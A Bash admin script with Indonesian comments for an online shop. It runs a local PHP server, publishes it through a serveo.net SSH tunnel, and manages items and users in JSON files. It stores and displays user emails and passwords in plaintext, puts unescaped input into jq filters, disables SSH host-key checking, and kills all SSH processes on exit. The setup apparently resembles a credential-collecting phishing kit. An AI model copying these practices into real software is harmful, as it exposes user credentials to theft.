#!/bin/bash

DATA_FILE="data.json"
USERS_FILE="users_log.json"

# ====== Pastikan file ada ======
[ ! -f "$DATA_FILE" ] && echo '{"barang":[]}' > "$DATA_FILE"
[ ! -f "$USERS_FILE" ] && echo '{"users":[]}' > "$USERS_FILE"

trap ctrl_c INT
ctrl_c() {
    echo -e "\n[!] Keluar..."
    pkill -f php >/dev/null 2>&1
    pkill -f ssh >/dev/null 2>&1
    exit 0
}

# ====== Banner ======
banner() {
    clear
    echo "==============================="
    echo "      TOKO ADRIAN ADMIN"
    echo "==============================="
    echo
}

# ====== Start PHP & Serveo ======
start_php_serveo() {
    fuser -k 3333/tcp >/dev/null 2>&1
    php -S localhost:3333 >/dev/null 2>&1 &
    sleep 2
    echo "[*] PHP server berjalan di localhost:3333"

    [[ -f sendlink ]] && rm sendlink
    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2>/dev/null > sendlink &
    sleep 8
    LINK=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
    if [[ -n "$LINK" ]]; then
        echo "[+] Serveo Link: $LINK"
    else
        echo "[!] Gagal mendapatkan Serveo link"
    fi
}

# ====== Menu ======
show_menu() {
    echo
    echo "=== MENU ADMIN ==="
    echo "[1] Lihat barang"
    echo "[2] Tambah barang"
    echo "[3] Edit barang"
    echo "[4] Hapus barang"
    echo "[5] Lihat user"
    echo "[6] Tambah user"
    echo "[7] Edit user"
    echo "[8] Hapus user"
    echo "[0] Keluar"
    echo
}

# ====== Barang ======
list_barang() {
    jq -r '.barang | to_entries[] | "\(.key): \(.value.nama) | Stok: \(.value.stok) | Gambar: \(.value.gambar)"' "$DATA_FILE"
}

tambah_barang() {
    read -p "Nama barang: " NAMA
    read -p "Stok: " STOK
    read -p "URL gambar: " GAMBAR
    jq ".barang += [{\"nama\":\"$NAMA\",\"stok\":$STOK,\"gambar\":\"$GAMBAR\"}]" "$DATA_FILE" > tmp.json && mv tmp.json "$DATA_FILE"
    echo "[*] Barang berhasil ditambahkan!"
}

edit_barang() {
    list_barang
    read -p "Pilih nomor barang yang ingin diedit: " IDX
    ITEM=$(jq -r ".barang[$IDX]" "$DATA_FILE")
    if [ "$ITEM" == "null" ]; then
        echo "[!] Index tidak valid"
        return
    fi
    read -p "Nama baru (kosong jika tidak diubah): " NAMA
    read -p "Stok baru (kosong jika tidak diubah): " STOK
    read -p "URL gambar baru (kosong jika tidak diubah): " GAMBAR
    [ -n "$NAMA" ] && jq ".barang[$IDX].nama=\"$NAMA\"" "$DATA_FILE" > tmp.json && mv tmp.json "$DATA_FILE"
    [ -n "$STOK" ] && jq ".barang[$IDX].stok=$STOK" "$DATA_FILE" > tmp.json && mv tmp.json "$DATA_FILE"
    [ -n "$GAMBAR" ] && jq ".barang[$IDX].gambar=\"$GAMBAR\"" "$DATA_FILE" > tmp.json && mv tmp.json "$DATA_FILE"
    echo "[*] Barang berhasil diupdate!"
}

hapus_barang() {
    list_barang
    read -p "Pilih nomor barang yang ingin dihapus: " IDX
    jq "del(.barang[$IDX])" "$DATA_FILE" > tmp.json && mv tmp.json "$DATA_FILE"
    echo "[*] Barang berhasil dihapus!"
}

# ====== User ======
list_user() {
    jq -r '.users | to_entries[] | "\(.key): \(.value.email) | Password: \(.value.password)"' "$USERS_FILE"
}

tambah_user() {
    read -p "Email user: " EMAIL
    read -p "Password user: " PASS
    jq ".users += [{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}]" "$USERS_FILE" > tmp.json && mv tmp.json "$USERS_FILE"
    echo "[*] User berhasil ditambahkan!"
}

edit_user() {
    list_user
    read -p "Pilih nomor user yang ingin diedit: " IDX
    USER=$(jq -r ".users[$IDX]" "$USERS_FILE")
    if [ "$USER" == "null" ]; then
        echo "[!] Index tidak valid"
        return
    fi
    read -p "Email baru (kosong jika tidak diubah): " EMAIL
    read -p "Password baru (kosong jika tidak diubah): " PASS
    [ -n "$EMAIL" ] && jq ".users[$IDX].email=\"$EMAIL\"" "$USERS_FILE" > tmp.json && mv tmp.json "$USERS_FILE"
    [ -n "$PASS" ] && jq ".users[$IDX].password=\"$PASS\"" "$USERS_FILE" > tmp.json && mv tmp.json "$USERS_FILE"
    echo "[*] User berhasil diupdate!"
}

hapus_user() {
    list_user
    read -p "Pilih nomor user yang ingin dihapus: " IDX
    jq "del(.users[$IDX])" "$USERS_FILE" > tmp.json && mv tmp.json "$USERS_FILE"
    echo "[*] User berhasil dihapus!"
}

# ====== Mulai Program ======
banner
start_php_serveo

while true; do
    show_menu
    read -p "Pilihan: " OPT
    case $OPT in
        1) list_barang ;;
        2) tambah_barang ;;
        3) edit_barang ;;
        4) hapus_barang ;;
        5) list_user ;;
        6) tambah_user ;;
        7) edit_user ;;
        8) hapus_user ;;
        0) echo "Keluar..."; pkill -f php >/dev/null 2>&1; pkill -f ssh >/dev/null 2>&1; exit 0 ;;
        *) echo "[!] Pilihan tidak valid" ;;
    esac
done
